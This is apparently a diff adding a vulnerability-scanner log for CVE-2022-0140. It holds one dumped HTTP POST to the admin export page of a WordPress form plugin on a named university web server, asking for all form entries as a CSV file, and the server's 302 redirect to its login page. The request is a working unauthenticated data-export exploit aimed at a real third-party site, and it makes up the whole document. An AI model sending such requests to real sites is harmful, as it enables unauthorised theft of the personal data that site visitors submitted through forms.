@@ -1,0 +1,29 @@
+[CVE-2022-0140] Dumped HTTP request for https://ess.science.unimelb.edu.au/wp-admin/admin.php?page=vfb-export
+
+
+POST /wp-admin/admin.php?page=vfb-export HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 116
+Content-Type: application/x-www-form-urlencoded
+Origin: https://ess.science.unimelb.edu.au
+Referer: https://ess.science.unimelb.edu.au/wp-admin/admin.php?page=vfb-export
+Accept-Encoding: gzip
+
+vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File
+[CVE-2022-0140] Dumped HTTP response https://ess.science.unimelb.edu.au/wp-admin/admin.php?page=vfb-export
+
+HTTP/1.1 302 Found
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:41 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://blogs.unimelb.edu.au/ess/wp-login.php?redirect_to=https%3A%2F%2Fblogs.unimelb.edu.au%2Fess%2Fwp-admin%2Fadmin.php%3Fpage%3Dvfb-export&reauth=1
+Server: openresty
+X-Cache-Bypass-Reason: Special url
+X-Redirect-By: WordPress
+
+
